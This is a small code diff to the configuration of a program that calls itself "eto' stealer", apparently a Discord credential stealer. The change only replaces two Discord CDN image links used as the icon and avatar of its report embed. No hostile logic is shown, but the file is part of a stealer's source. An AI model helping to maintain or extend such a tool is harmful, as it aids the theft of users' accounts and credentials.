@@ -26,10 +26,10 @@ var config = {
         username: "eto' stealer",
         footer: {
             text: `eto' stealer`,
-            icon_url: "https://cdn.discordapp.com/attachments/1101359729307041865/1101367965993140235/clap-3938697605.gif",
+            icon_url: "https://cdn.discordapp.com/avatars/1104795533052235846/51bba268009496b110f1372d9eeb747d.png?size=4096",
         },
         href: "https://eto.wtf",
-        avatar_url: "https://cdn.discordapp.com/attachments/1101359729307041865/1101367965993140235/clap-3938697605.gif"
+        avatar_url: "https://cdn.discordapp.com/avatars/1104795533052235846/51bba268009496b110f1372d9eeb747d.png?size=4096"
     },
 
     badges: {
